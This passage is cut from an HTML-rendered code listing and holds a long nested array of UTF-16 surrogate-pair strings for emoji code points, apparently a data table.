class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span 